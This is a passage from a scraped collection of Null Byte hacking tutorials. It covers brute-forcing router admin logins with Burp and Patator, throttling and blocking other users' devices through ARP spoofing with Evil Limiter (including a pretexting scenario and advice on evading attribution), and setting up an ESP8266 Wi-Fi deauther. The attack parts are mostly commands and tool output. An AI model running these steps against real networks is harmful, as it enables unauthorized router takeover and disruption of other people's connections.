     : decode from hexadecimal\nb64         : encode in base64\nmd5         : hash in md5\nsha1        : hash in sha1\nurl         : url encode\nFor example, to encode every password in base64:\n... host=10.0.0.1 user=admin password=_@@_FILE0_@@_ -e _@@_:b64\nPlease read the README inside for more examples and usage information.\n1. Attacking the Medialink AC1200 Router\nThe first router being attacked is the Medialink AC1200. It's currently one of Amazon's top choices for consumer router's and quite popular.\nStep 1: Capture a Login Request with Burp\nAfter configuring Firefox with Burp Suite's Proxy module, navigate to the AC1200's gateway at http://192.168.8.1/login.html.\nType \"password\" into the password field and press Enter. Burp will intercept the login and display the below request.\nStep 2: Identify the Parameters\nNotice the password= parameter isn't \"password\" as expected, but instead the scrambled \"5f4dcc3b5aa765d61d8327deb882cf99\" string.\nThose familiar with password hashing may recognize the hash as the MD5 for \"password.\" It can be verified using the below command which prints the desired string into the md5sum command.\n~# printf 'password' | md5sum\n5f4dcc3b5aa765d61d8327deb882cf99  -\nThat tells us that the wordlist used when brute-forcing the gateway must be in MD5 format. With this particular router, at the gateway, there's no available field for username input. We can see from the captured data that the \"admin\" username is embedded into the request. So there's only one dynamic parameter: the password.\nStep 3: Modify & Save the Raw Request\nChange the hashed password parameter to \"FILE0\" within the request. The modification will act as a placeholder in the request that indicates to Patator where to insert the passwords. (The reason for this will be clear in a later step.)\nWhen that's done, right-click inside the Burp window and select the \"Copy to file\" option. Save it to the /tmp directory with the \"router_request.txt\" filename.\nStep 4: Generate a Targeted Wordlist\nAs we discovered previously, passwords are hashed in the browser before being sent to the router. Patator has a built-in feature to hash passwords, but let's take this opportunity to learn some Bash password manipulation tricks.\nFirst, download a preferred wordlist. Any generic wordlist will do fine for testing purposes. Use the below wget command to download my wordlist generated by analyzing leaked databases.\n~# wget 'https://git.io/fhhvc' -O /tmp/wordlist.txt\n--2020-01-15 03:19:58--  https://git.io/fhhvc\nResolving git.io (git.io)... 52.7.169.168\nConnecting to git.io (git.io)|52.7.169.168|:443... connected.\nHTTP request sent, awaiting response... 302 Found\nLocation: https://raw.githubusercontent.com/tokyoneon/1wordlist/master/1wordlist2rulethem%40ll.txt [following]\n--2019-03-08 03:20:01--  https://raw.githubusercontent.com/tokyoneon/1wordlist/master/1wordlist2rulethem%40ll.txt\nResolving raw.githubusercontent.com (raw.githubusercontent.com)... 151.101.68.133\nConnecting to raw.githubusercontent.com (raw.githubusercontent.com)|151.101.68.133|:443... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 25585 (25K) [text/plain]\nSaving to: ‘wordlist.txt’\nwordlist.txt                      100%[========================================>]  24.99K  68.9KB/s    in 0.4s\n2020-01-15 03:20:05 (68.9 KB/s) - ‘wordlist.txt’ saved [25585/25585]\nThe below Bash one-liner will use a while loop to iterate through the passwords in the wordlist. Each password will be converted into an MD5 and appended to the md5_wordlist.txt file.\n~# while read password; do printf \"$password\" | md5sum | awk '{print $1}'; done < /tmp/wordlist.txt >>/tmp/md5_wordlist.txt\nThe new md5_wordlist.txt file can be viewed using the below head command, to print the first ten lines.\n~# head /tmp/md5_wordlist.txt\ne10adc3949ba59abbe56e057f20f883e\ne587466319da83fe4bdf4ceae9746357\ndc483e80a7a0bd9ef71d8cf973673924\neba4820c4a707c3c72d16050177423b6\n9924d38821446082ce5e4c9d88e1430f\nb3d3bdba829b1fef75a5b22c20a14738\n5f4dcc3b5aa765d61d8327deb882cf99\ne680528370af6ef220d0f23b8e58e812\nd234e0453a5f37630379880b9136e959\n1acc444503b44377c3ba6e595fcf2940\nStep 5: Identify & Filter Failed Requests\nWith the router_request.txt and the wordlist of hashed passwords, the router's gateway can be brute-forced with the following Patator command. To stop the brute-force attack at any time, press Control-C on the keyboard.\n~# patator http_fuzz raw_request=/tmp/router_request.txt accept_cookie=1 follow=1 0=/tmp/md5_wordlist.txt -l /tmp/AC1200\nTo break that command down:\n* raw_request= — Use the router_request.txt created in an earlier step to generate login attempts against the router's gateway.\n* accept_cookie= — Save received cookies to issue them in future requests.\n* follow= — Follow Location redirects (e.g., status code 302), for both failed and successful login attempts if instructed by the server.\n* 0= — The \"FILE0\" placeholder in the router_request.txt will iterate through the provided list of passwords.\n* -l — Save output data into the provided directory. All of Patator's responses will be stored in an organized fashion.\nAfter running the command, my output looks like this:\ncode size:clen       time | candidate                          |   num | mesg\n-----------------------------------------------------------------------------\n200  20:-1          0.015 | e10adc3949ba59abbe56e057f20f883e   |     1 | HTTP/1.0 200 OK\n200  20:-1          0.035 | e587466319da83fe4bdf4ceae9746357   |     2 | HTTP/1.0 200 OK\n200  20:-1          0.048 | dc483e80a7a0bd9ef71d8cf973673924   |     3 | HTTP/1.0 200 OK\n200  20:-1          0.041 | eba4820c4a707c3c72d16050177423b6   |     4 | HTTP/1.0 200 OK\n200  20:-1          0.054 | 9924d38821446082ce5e4c9d88e1430f   |     5 | HTTP/1.0 200 OK\n200  20:-1          0.060 | 5f4dcc3b5aa765d61d8327deb882cf99   |     7 | HTTP/1.0 200 OK\n200  20:-1          0.067 | 1acc444503b44377c3ba6e595fcf2940   |    10 | HTTP/1.0 200 OK\n200  20:-1          0.069 | 25d55ad283aa400af464c76d713c07ad   |    11 | HTTP/1.0 200 OK\n200  20:-1          0.069 | d8578edf8458ce06fbc5bb76a58c5ca4   |    12 | HTTP/1.0 200 OK\n200  20:-1          0.070 | bfcfa776182bf88f23cc0e78bde9bd55   |    13 | HTTP/1.0 200 OK\n200  20:-1          0.070 | 5fcfd41e547a12215b173ff47fdd3739   |    14 | HTTP/1.0 200 OK\n200  20:-1          0.070 | 02c75fb22c75b23dc963c7eb91a062cc   |    15 | HTTP/1.0 200 OK\n200  20:-1          0.079 | b3d3bdba829b1fef75a5b22c20a14738   |     6 | HTTP/1.0 200 OK\n200  20:-1          0.070 | f26e6a5828c8a1c908f86c0674c4b0c1   |    16 | HTTP/1.0 200 OK\n200  20:-1          0.070 | 0d107d09f5bbe40cade3de5c71e9e9b7   |    17 | HTTP/1.0 200 OK\n200  20:-1          0.073 | e680528370af6ef220d0f23b8e58e812   |     8 | HTTP/1.0 200 OK\n200  20:-1          0.070 | 25f9e794323b453885f5181f1b624d0b   |    18 | HTTP/1.0 200 OK\n200  20:-1          0.086 | d234e0453a5f37630379880b9136e959   |     9 | HTTP/1.0 200 OK\n200  20:-1          0.069 | 9aaee58c21bf17a001b5325dffecbb6c   |    19 | HTTP/1.0 200 OK\n200  20:-1          0.069 | c41788ac68e6c17c59a6412c424dc763   |    20 | HTTP/1.0 200 OK\n200  20:-1          0.069 | 7702417fd301623eff2ba8f6abf05ff6   |    21 | HTTP/1.0 200 OK\n200  20:-1          0.069 | a79e7fabc870d2c67141008c58088b47   |    31 | HTTP/1.0 200 OK\n200  20:-1          0.069 | e99a18c428cb38d5f260853678922e03   |    22 | HTTP/1.0 200 OK\n200  20:-1          0.069 | 4297f44b13955235245b2497399d7a93   |    32 | HTTP/1.0 200 OK\n200  20:-1          0.069 | e7d094da9fe5b55c3a84806ba4fd3276   |    23 | HTTP/1.0 200 OK\n200  20:-1          0.067 | 9ccc031dbebc6705fc8443df29b0971f   |    33 | HTTP/1.0 200 OK\n200  20:-1          0.069 | 04085330aed79347b6427f9111ce384f   |    24 | HTTP/1.0 200 OK\n200  20:-1          0.069 | 1c63129ae9db9c60c3e8aa94d3e00495   |    34 | HTTP/1.0 200 OK\n200  20:-1          0.069 | ccebddaa34a9459df50d2d32177ea06e   |    25 | HTTP/1.0 200 OK\n200  20:-1          0.069 | 5416d7cd6ef195a0f7622a9c56b55e84   |    26 | HTTP/1.0 200 OK\n200  20:-1          0.069 | dccfdb716551ca6210e9b93248674dd7   |    27 | HTTP/1.0 200 OK\n200  20:-1          0.069 | 1f6cac35000ad57b1af2e34926043ebe   |    28 | HTTP/1.0 200 OK\n200  20:-1          0.069 | bed128365216c019988915ed3add75fb   |    29 | HTTP/1.0 200 OK\n200  20:-1          0.069 | bc597773a32c44479efd83855733aed6   |    30 | HTTP/1.0 200 OK\n200  20:-1          0.071 | d5e0708d403467017d4dd217178112b5   |    41 | HTTP/1.0 200 OK\n200  20:-1          0.071 | 161ebd7d45089b3446ee4e0d86dbcf92   |    42 | HTTP/1.0 200 OK\n200  20:-1          0.070 | 5dc5d1aa29ea20ce91ec6c7fe5a44f56   |    43 | HTTP/1.0 200 OK\n200  20:-1          0.070 | 3d68b18bd9042ad3dc79643bde1ff351   |    44 | HTTP/1.0 200 OK\n200  20:-1          0.069 | b76be48e061aa8948d153fec67a08cb4   |    35 | HTTP/1.0 200 OK\n200  20:-1          0.071 | 3bf1289e5cd6187c0e0de34edfe27b90   |    45 | HTTP/1.0 200 OK\nHypertext Transfer Protocol (HTTP) status codes, also known as response codes, are issued by web servers to our web browser when we make requests. These codes are a way for web servers to communicate errors to syadmins, web developers, and end-users alike.\nSometimes the 200 (\"200 OK\") status code is an indication that the server accepted the provided password. In this case, every single login attempt is producing the \"200 OK\" response — so it's actually helping to identify what a failed login attempt looks like.\nThe \"size\" column can also be extremely helpful. It will display the size (in bytes) of the server's response to the login attempt. It's returning 20 bytes with every login attempt, so it's probably safe to assume this byte size indicates a failed login attempt, in which case, it's safe to omit responses of that size. We can do so by adding the -x ignore:size=20 option and argument.\n~# patator http_fuzz raw_request=router_request.txt -x ignore:size=20 accept_cookie=1 follow=1 0=/tmp/md5_wordlist.txt -l /tmp/AC1200\ncode size:clen       time | candidate                          |   num | mesg\n-----------------------------------------------------------------------------\n200  3962:3363      0.201 | d487dd0b55dfcacdd920ccbdaeafa351   |   291 | HTTP/1.0 200 OK\nHits/Done/Skip/Fail/Size: 1/3142/0/0/3142, Avg: 138 r/s, Time: 0h 0m 22s\nNow, only one request is displayed, with a size of 3,962 bytes.\nThere are a few ways of unhashing a discovered password. The passwords in both wordlist.txt and md5_wordlist.txt appear in the same order. The only difference is that one wordlist is in plain text; the other is hashed.\nBelow, we'll use nl to prepend a number to every line in the md5_wordlist.txt, then grep for the hash.\n~# nl /tmp/md5_wordlist.txt | grep 'd487dd0b55dfcacdd920ccbdaeafa351'\n291 d487dd0b55dfcacdd920ccbdaeafa351\nThe hash appears on line 291 of the md5_wordlist.txt file. Now, use nl on the plain text wordlist, and grep to find the line number.\n~# nl /tmp/wordlist.txt | grep '291'\nThe password is \"yellow.\" It can be further verified using the following command.\n~# printf 'yellow' | md5sum\nd487dd0b55dfcacdd920ccbdaeafa351\n2. Attacking the Netgear N300 Router\nA router from the Netgear N300 series is next on the list of targets. It's also one of Amazon's top choices for entry-level, consumer Wi-Fi routers.\nStep 1: Capture a Login Request with Burp\nWe'll follow the same procedure as before, starting with capturing the raw request. Navigate to the router's gateway using a web browser configured to proxy through Burp. Enter the \"admin\" and \"password\" credentials when prompted.\nStep 2: Identify the Parameters\nNotice this time there isn't an obvious password= parameter like the Medialink AC1200 router.\nThe above string isn't hashed with MD5. While it may appear encrypted or secured in some way, it's using a simple base64 encoding. The string is decoded using the below command.\n~# printf 'YWRtaW46cGFzc3dvcmQ=' | base64 -d\nadmin:password\nThe username and password are concatenated into a single string and encoded. This authentication method is called basic HTTP authentication. It should only be used with HTTPS, as an attacker on the network can easily capture the credentials in transit.\nStep 3: Modify & Save the Raw Request\nWith the username and password parameters identified, the raw request is modified to include the Patator placeholder (\"FILE0\") and saved to a local file.\nRight-click inside the window and select the \"Copy to file\" option. Save it to the /tmp directory with the \"router_request.txt\" filename.\nStep 4: Generate a Targeted Wordlist\nNow that we know the kind of authentication parameter being used, a wordlist can be generated specific to the router. Again, Patator has a built-in feature to encode passwords, but string manipulation with Bash is a good skill to learn. It can be applied to other brute-forcing tools, for example.\nDownload a generic wordlist for testing purposes. Use the below wget command to download my wordlist generated by analyzing leaked databases.\n~# wget 'https://git.io/fhhvc' -O /tmp/wordlist.txt\nThe below Bash one-liner will use a while loop to iterate through the passwords in the wordlist. Each password will be concatenated into a single string with the username and password converted into base64. All of the encoded strings are appended to the /tmp/base64_wordlist.txt file.\n~# while read password; do printf \"admin:$password\" | base64; done < /tmp/wordlist.txt >>/tmp/base64_wordlist.txt\nThe encoded passwords can be verified using the below head command to print the first ten lines of the file.\n~# head /tmp/base64_wordlist.txt\nYWRtaW46MTIzNDU2\nYWRtaW46QWJjZGVmMTIz\nYWRtaW46YTEyMzQ1Ng==\nYWRtaW46bGl0dGxlMTIz\nYWRtaW46bmFuZGEzMzQ=\nYWRtaW46Tjk3bm9raWE=\nYWRtaW46cGFzc3dvcmQ=\nYWRtaW46UGF3ZXJqb24xMjM=\nYWRtaW46NDIxdWlvcHkyNTg=\nYWRtaW46TVl3b3JrbGlzdDEyMw==\nStep 5: Identify & Filter Failed Requests\nThe router's gateway can be brute-forced with Patator using the router_request.txt and base64_wordlist.txt files. Remember, while in progress, Patator can be stopped at any time by pressing Control-C on the keyboard.\n~# patator http_fuzz raw_request=/tmp/router_request.txt accept_cookie=1 follow=1 0=/tmp/base64_wordlist.txt -l /tmp/N300\ncode size:clen       time | candidate                          |   num | mesg\n-----------------------------------------------------------------------------\n401  508:-1         0.006 | YWRtaW46MTIzNDU2                   |     1 | HTTP/1.0 401 Unauthorized\n401  508:-1         0.023 | YWRtaW46MTIzNDU2Nzg=               |    11 | HTTP/1.0 401 Unauthorized\n401  508:-1         0.022 | YWRtaW46Y2h1cnUxMjNB               |    21 | HTTP/1.0 401 Unauthorized\n401  508:-1         0.023 | YWRtaW46QWJjZGVmMTIz               |     2 | HTTP/1.0 401 Unauthorized\n401  508:-1         0.024 | YWRtaW46cXdlcnR5                   |    12 | HTTP/1.0 401 Unauthorized\n401  508:-1         0.007 | YWRtaW46YTEyMzQ1Ng==               |     3 | HTTP/1.0 401 Unauthorized\n401  508:-1         0.024 | YWRtaW46bmtzMjMwa2pzODI=           |    13 | HTTP/1.0 401 Unauthorized\n401  508:-1         0.024 | YWRtaW46bGl0dGxlMTIz               |     4 | HTTP/1.0 401 Unauthorized\n401  508:-1         0.025 | YWRtaW46bmFuZGEzMzQ=               |     5 | HTTP/1.0 401 Unauthorized\n401  508:-1         0.026 | YWRtaW46enhjdmJubQ==               |    15 | HTTP/1.0 401 Unauthorized\n401  508:-1         0.023 | YWRtaW46Tjk3bm9raWE=               |     6 | HTTP/1.0 401 Unauthorized\nHTTP status codes are split into several categories or \"classes.\" The first digit defines the categories, and the following digits are subcategories specific to different types of error messages. For example, the 4xx categories are a class of errors specific to HTTP requests that cannot be fulfilled by the web server, like trying to view a webpage that doesn't exist. That's defined as a status \"404 Not Found,\" probably one of the most well-known status codes on the internet.\nWe immediately notice a ton of 401 status codes in the Patator output, which are clear indications of a failed login requests. These are omitted from the output using the -x ignore:code=401 option and argument.\n~# patator http_fuzz raw_request=/tmp/router_request.txt -x ignore:code=401 accept_cookie=1 follow=1 0=/tmp/base64_wordlist.txt -l /tmp/N300\ncode size:clen       time | candidate                          |   num | mesg\n-----------------------------------------------------------------------------\n200  622:-1         0.017 | YWRtaW46cGFzc3dvcmQ=               |     7 | HTTP/1.0 200 OK\nThis time, we received only one request with the 200 status code. The size of the response is 622 bytes, more than that of a failed 401 response. It's a good sign. The login credentials are decoded using the following command.\n~# printf 'YWRtaW46cGFzc3dvcmQ=' | base64 -d\nadmin:password\nHow to Protect Yourself from Router Gateway Attacks\nRegularly updating the firmware will help prevent against exploits and Routersploit attacks. A strong (non-default) password will prevent brute-force attacks performed with Patator.\n* Update the firmware. Router manufacturers often issue bug and exploit patches. It's important to keep the router firmware up to date and have it check for updates automatically if possible.\n* Disable remote administration. Some consumer routers allow for remote access by default. Without knowing it, hackers may find your router on Shodan and seize control of it.\n* WPA2 encryption. Only use WPA2 encryption. Weaker encryption options like WEP will leave the router extremely vulnerable to attackers.\n* Change default passwords. Never use the default credentials. In addition to the WPA2 pre-shared key, the admin portal (router gateway) should also be protected by a strong password. It's the only defensive measure preventing an attacker from discovering default credentials and modifying sensitive settings.\n* Disable WPS. WPS is featured in most consumer routers and designed to make password-less authentication more convenient. Unfortunately, the feature is usually enabled by default and easily exploited by hackers.\n* Be persistent. Change your Wi-Fi password every few months. It's a pain to update the Wi-Fi password for every device on the network, but this tactic will keep hackers guessing — literally. If a hacker has captured the WPA2 handshake and spends several weeks trying to crack the password, changing it will render the captured handshake useless.\nUnfortunately, none of the routers I tested support HTTPS when authenticating the admin settings. So an attacker on the network inspecting traffic will be able to passively discover the login password — even if it's a totally random 42-character password.\nUntil next time, follow me on Twitter @tokyoneon_ and GitHub. And as always, leave a comment below or message me on Twitter if you have any questions.\nJust updated your iPhone? You'll find new features for Podcasts, News, Books, and TV, as well as important security improvements and fresh wallpapers. Find out what's new and changed on your iPhone with the iOS 17.5 update.\nCover photo and screenshots by tokyoneon/Null Byte",
        "category": "Wifi Hacking"
    },
    {
        "title": "Control Network Traffic with Evil Limiter to Throttle or Kick Off Devices",
        "link": "https://null-byte.wonderhowto.com/how-to/control-network-traffic-with-evil-limiter-throttle-kick-off-devices-0196137/",
        "content": "* WonderHowTo\nIf you find yourself with a roommate hogging limited data bandwidth with video games or discover a neighbor has invited themselves into your Wi-Fi network, you can easily take back control of your internet access. Evil Limiter does this by letting you control the bit rate of any device on the same network as you, allowing you to slow or even stop data transfer speeds for them completely.\nGenerally speaking, the average user doesn't have much visibility over who or what is on their network, so anyone with the password can slip in and start using bandwidth. In other situations, a roommate or family member may be hogging all the bandwidth unfairly to play video games or stream videos. Some routers have web interfaces that allow you to set limits on each connection, but without the password to the router, this option may not be accessible.\n* Don't Miss: Use & Abuse ARP to Locate Hosts on a Network\nEvil Limiter uses ARP spoofing to make devices send data to the attacking computer rather than the router, allowing us to send the data on to the router at whatever speed we like. Thanks to the way the ARP protocol works, it's possible to control the speed of any device on a shared network connection. However, because ARP spoofing only works on IPv4 networks, this tool won't be effective on IPv6 for now.\nEvil Limiter for Hackers\nFor a hacker, Evil Limiter allows easy targeting of either one, a few, or all devices on a network. It's easy to cut the cord on the internet of a particular device at any moment, allowing for a convenient pretext for a social engineering attack. If a hacker wanted access to an employees-only area, they could identify the device of employees in the area they want to be, then limit the speed of their connection.\nRather than showing up unannounced, a hacker could throttle the manager's data connection while pretending to call from the utility company to ask if the internet connection has been slow. When the manager finds the internet is indeed slow, the hacker simply asks the best time to send someone over to fix it, giving them a pretext to enter the building and preventing the target calling the real utility company.\nWhat You'll Need\nTo use Evil Limiter, you'll need a Linux system like Kali or Ubuntu with Python3 or higher. While a powerful advantage of Evil Limter is that it can be run on networks even when you don't have administrator privileges, I recommend making sure you have permission to run the tool on any network you want to test it on.\nEvil Limiter uses the ARP packet to limit connection speeds which is present in IPv4 networks, but not in IPv6 networks. Because of this, IPv6 systems are out of reach of this tool, as mentioned before.\n* Don't Miss: Understand & Use IPv4 to Navigate a Network\nStep 1: Install Evil Limiter\nTo install Evil Limiter, there are only a few commands to throw in a terminal window, seen below. When the required libraries finish installing, Evil Limiter should be installed and ready to run.\n~# git clone https://github.com/bitbrute/evillimiter.git\n~# cd evillimiter\n~# sudo python3 setup.py install\nStep 2: Connect to the Network\nNow, you'll need to connect to your target network. Afterward, you can run Evil Limiter by typing evillimiter in a new terminal window. You should see something like below.\n~# evillimiter\n███████╗██╗   ██╗██╗██╗       ██╗     ██╗███╗   ███╗██╗████████╗███████╗██████╗\n██╔════╝██║   ██║██║██║       ██║     ██║████╗ ████║██║╚══██╔══╝██╔════╝██╔══██╗\n█████╗  ██║   ██║██║██║       ██║     ██║██╔████╔██║██║   ██║   █████╗  ██████╔╝\n██╔══╝  ╚██╗ ██╔╝██║██║       ██║     ██║██║╚██╔╝██║██║   ██║   ██╔══╝  ██╔══██╗\n███████╗ ╚████╔╝ ██║███████╗  ███████╗██║██║ ╚═╝ ██║██║   ██║   ███████╗██║  ██║\n╚══════╝  ╚═══╝  ╚═╝╚══════╝  ╚══════╝╚═╝╚═╝     ╚═╝╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝\nby bitbrute  ~  limit devices on your network :3\nOK   interface: wlan0\nOK   gateway ip: 192.168.5.1\nOK   gateway mac: 84:██:██:██:██:1a\nOK   netmask: 255.255.255.0\ntype help or ? to show command information.\nIf you see this, Evil Limiter is installed, connected to the network, and ready to go.\nStep 3: View Available Commands\nYou can explore the functionality of Evil Limiter by looking through the menu system and checking out the available commands. To do so, type a question mark in the terminal to pull up the help page.\n(Main) >>> ?\nscan                          scans for online hosts on your network.\nrequired to find the hosts you want to limit.\nhosts                         lists all scanned hosts.\ncontains host information, including IDs.\nlimit [ID1,ID2,...] [rate]    limits bandwith of host(s) (uload/dload).\ne.g.: limit 4 100kbit\nlimit 2,3,4 1gbit\nlimit all 200kbit\nblock [ID1,ID2,...]           blocks internet access of host(s).\ne.g.: block 3,2\nfree [ID1,ID2,...]            unlimits/unblocks host(s).\ne.g.: free 3\nadd [IP] (--mac [MAC])        adds custom host to host list.\nmac resolved automatically.\ne.g.: add 192.168.178.24\nadd 192.168.1.50 --mac 1c:fc:bc:2d:a6:37\nclear                         clears the terminal window.\nStep 4: Discover Devices\nAs we can see above, the commands are straightforward. To find devices on the network, all you need to do is type scan.\n(Main) >>> scan\n100% |██████████████████████████████| 256/256\nOK   7 hosts discovered.\nThe scan will pull up any other hosts on the network. Type hosts to show them all.\n(Main) >>> hosts\n┌Hosts──────────────┬───────────────────┬──────────┬────────┐\n│ ID │ IP-Address   │ MAC-Address       │ Hostname │ Status │\n├────┼──────────────┼───────────────────┼──────────┼────────┤\n│ 0  │ 192.168.5.1  │ 84:██:██:██:██:1a │ _gateway │ Free   │\n│ 1  │ 192.168.5.2  │ 0c:██:██:██:██:f5 │          │ Free   │\n│ 2  │ 192.168.5.4  │ 3c:██:██:██:██:6f │          │ Free   │\n│ 3  │ 192.168.5.24 │ 60:██:██:██:██:78 │          │ Free   │\n│ 4  │ 192.168.5.25 │ c4:██:██:██:██:2b │          │ Free   │\n│ 5  │ 192.168.5.61 │ 8c:██:██:██:██:f5 │          │ Free   │\n│ 6  │ 192.168.5.67 │ f0:██:██:██:██:b5 │          │ Free   │\n└────┴──────────────┴───────────────────┴──────────┴────────┘\nIn my example, seven devices have been discovered on the network, with one of them being the router. Now we have a target list with which we can block or limit access, so let's give it a try.\nStep 5: Limit or Block Devices\nIf you want to limit every device except the router, you can list them off one by one after the limit command. You'll also have to specify the speed you want to limit them to. In my case, I'll go with 200kbit as the limiting speed.\nYou could use the limit all command to choose everything, but because you want to leave the router alone, type the command limit 1,2,3,4,5,6 instead to begin limiting those specific devices. The amount of devices you list depends on how many you found.\n* Don't Miss: Stealing Wi-Fi Passwords with an Evil Twin Attack\n(Main) >>> limit 1,2,3,4,5,6 200kbit\nOK   192.168.5.2 limited to 200kbit.\nOK   192.168.5.4 limited to 200kbit.\nOK   192.168.5.24 limited to 200kbit.\nOK   192.168.5.25 limited to 200kbit.\nOK   192.168.5.61 limited to 200kbit.\nOK   192.168.5.67 limited to 200kbit.\nNow that we've limited some devices, we can also select any devices we want to block entirely from accessing the network. I've found that sometimes Evil Limiter can be heavy-handed while limiting connections, and the result is that devices are limited so much they might as well be blocked.\nTo block a device, type the block command, then the number of any device you want to prevent from receiving data over the network.\n(Main) >>> block 3\nOK   192.168.5.24 blocked.\nTry hosts a second time. The majority of the network should be blocked or limited.\n(Main) >>> hosts\n┌Hosts──────────────┬───────────────────┬──────────┬─────────┐\n│ ID │ IP-Address   │ MAC-Address       │ Hostname │ Status  │\n├────┼──────────────┼───────────────────┼──────────┼─────────┤\n│ 0  │ 192.168.5.1  │ 84:██:██:██:██:1a │ _gateway │ Free    │\n│ 1  │ 192.168.5.2  │ 0c:██:██:██:██:f5 │          │ Limited │\n│ 2  │ 192.168.5.4  │ 3c:██:██:██:██:6f │          │ Limited │\n│ 3  │ 192.168.5.24 │ 60:██:██:██:██:78 │          │ Blocked │\n│ 4  │ 192.168.5.25 │ c4:██:██:██:██:2b │          │ Limited │\n│ 5  │ 192.168.5.61 │ 8c:██:██:██:██:f5 │          │ Limited │\n│ 6  │ 192.168.5.67 │ f0:██:██:██:██:b5 │          │ Limited │\n└────┴──────────────┴───────────────────┴──────────┴─────────┘\nStep 6: Restore Normal Connection\nNow that you've caused chaos on the network, it's time to set things back the way they were. Fortunately, doing so is easy. You can choose to either restore devices one by one or run free all to undo any limitations on network devices.\n(Main) >>> free all\nOK   192.168.5.2 freed.\nOK   192.168.5.4 freed.\nOK   192.168.5.24 freed.\nOK   192.168.5.25 freed.\nOK   192.168.5.61 freed.\nOK   192.168.5.67 freed.\nRun hosts a third time, and network access should be normal again for all devices.\n(Main) >>> hosts\n┌Hosts──────────────┬───────────────────┬──────────┬────────┐\n│ ID │ IP-Address   │ MAC-Address       │ Hostname │ Status │\n├────┼──────────────┼───────────────────┼──────────┼────────┤\n│ 0  │ 192.168.5.1  │ 84:██:██:██:██:1a │ _gateway │ Free   │\n│ 1  │ 192.168.5.2  │ 0c:██:██:██:██:f5 │          │ Free   │\n│ 2  │ 192.168.5.4  │ 3c:██:██:██:██:6f │          │ Free   │\n│ 3  │ 192.168.5.24 │ 60:██:██:██:██:78 │          │ Free   │\n│ 4  │ 192.168.5.25 │ c4:██:██:██:██:2b │          │ Free   │\n│ 5  │ 192.168.5.61 │ 8c:██:██:██:██:f5 │          │ Free   │\n│ 6  │ 192.168.5.67 │ f0:██:██:██:██:b5 │          │ Free   │\n└────┴──────────────┴───────────────────┴──────────┴────────┘\nEvil Limiter Is Effective but Aggressive\nIn my tests with Evil Limiter, I found it to be an extremely effective if sometimes overbearing tool. On occasion, my attempts to limit a target would instead wholly block it, so be sure to test the effectiveness of this tool before using it anywhere important.\nOne thing to keep in mind when using Evil Limiter is that ARP spoofing exposes your MAC address, so using this tool on a network is effectively telling everyone that your MAC address is the router. That leaves your MAC address in the ARP cache of every machine you're targeting, so make sure to spoof your MAC address before using this tool if you don't want to be leaving your machine's fingerprints all over the network.\nI hope you enjoyed this guide to using Evil Limiter! If you have any questions about this tutorial on ARP spoofing, leave a comment below, and feel free to reach me on Twitter @KodyKinzie.",
        "category": "Wifi Hacking"
    },
    {
        "title": "Scan, Fake & Attack Wi-Fi Networks with the ESP8266-Based WiFi Deauther",
        "link": "https://null-byte.wonderhowto.com/how-to/scan-fake-attack-wi-fi-networks-with-esp8266-based-wifi-deauther-0193837/",
        "content": "* DSTIKE WiFi Deauther Monster V2\nWhile all of these boards are unique and come with different hardware, all are based on the ESP8266, and any will work with the Wi-Fi Deauther program. Also, buying them supports the researcher behind the program, and it gives you access to extended hardware features that make the board more useful without needing a second device to control it.\nWhile there are rip-offs of the designs available for less or even more, they often don't use the same hardware or use cheaper manufacturing techniques, leading to frustrating failures that add up over time.\nReal and fake Deauther boards for comparison. Image via Spacehuhn's GitHub\nIf you're on a budget and don't mind using a device without a screen, you can do this project for cheap with either of the following boards. You can read more about the kinds of boards that will work for this project on Spacehuhn's GitHub page.\n* TZT NodeMCU (NOT version 3)\nThere are several versions of the NodeMCU, but only the version 1.0 fits nicely on a breadboard. The V3 is not as good for this project. Image via Spacehuhn's GitHub\nAside from the board, you'll need a computer or smartphone with Wi-Fi to join the network that the board creates. You'll need a Micro-USB cable to supply power, and a power source like a battery to plug it in to. Once you have a computer or smartphone to control the Deauther, with Micro-USB cable and power source, as well as a network you have permission to test out the Deauther on, you're ready to begin.\nStep 1: Get Your Board Ready\nIf you have the original board, it should come preloaded with the latest Wi-Fi Deauther program. You should be able to power on the board by plugging it into a USB power source and using the screen and selector switch to scroll through the menu options directly. Be careful with the selector switch, though, as it has a tendency to become unsoldered from the board and requires some basic knowledge of soldering to reattach.\nSkip to Step 2 if you're using the original Deauther board. If not, you'll need to take a few steps to get set up. First, download and install the Arduino IDE. Once you've done that, you'll need to click on the \"Arduino\" or \"File\" drop-down menu, then select \"Preferences\" from the menu that appears. Next, click the dual-window icon next to the Additional Boards Manager URLs field, then paste the following URLs, one each to a line. Once that's complete, click \"OK\" to save, then \"OK\" again to close the menu.\nhttp://arduino.esp8266.com/stable/package_esp8266com_index.json\nhttp://phpsecu.re/esp8266/package_deauther_index.json\nNext, you'll need to add the board you're using to the Boards Manager. To do this, you'll need to click on \"Tools,\" then hover over the \"Board\" section to see the drop-down list of supported boards. At the top, click \"Boards Manager\" to open the window that will allow us to add more boards.\nWhen the Boards Manager window opens, type \"esp8266\" into the search bar. Select and install both \"arduino-esp8266-deauther\" and \"esp8266\" to add support for the board to your Arduino IDE.\nOnce that is done, you should be ready to program your board. Plug your ESP8266-based board into your computer. When you click on \"Tools,\" you should see the correct port auto-selected, but if not, click on the \"Board\" option and select the correct one under the Deauther Modules section.\nIf you're using a bad cable, the port may not show up, so if you don't see anything after you've completed the other steps, try another cable first. If you still don't see anything, there's a good chance you need to install a driver by following these instructions, which is common when using cheap knockoff boards.\nNow, let's download the code onto the ESP8266-based Deauther board. Clone the repository with the command below, and then move the \"esp8266_deauther\" folder into your \"Arduino\" folder.\n~# git clone https://github.com/spacehuhn/esp8266_deauther.git\nWhen it's done downloading, open the \"esp8266_deauther.ino\" file with Arduino from inside the \"Arduino\" folder. Check your upload settings to make sure your board is properly selected, and press upload to send the program to the ESP8266 device!\nStep 2: Look for the Control Access Point\nOnce your Wi-Fi Deauther board is powered, you shouldn't need a screen to interact with it. While it's convenient to have a display to see what's going on, we can rely on the web interface to control the ESP8266 device as well.\n* Don't Miss: Detect When a Device Is Nearby with the ESP8266 Friend Detector\nThese chips are amazing because they can be put into many Wi-Fi modes, with the ability to join or even become their own Wi-Fi network. If you look on a smartphone or computer, you should see a Wi-Fi network nearby named \"pwned.\" This is a network being created by our Deauther board!\nTo access it, connect to the Wi-Fi network and enter the password \"deauther\" to join. Then, in a browser window, you can navigate to the default IP address of 192.168.4.1 or simply type deauth.me to access the web interface the Deauther board is creating.\nNow, agree to the notice that appears advising you not to do anything bad with this project. Once you 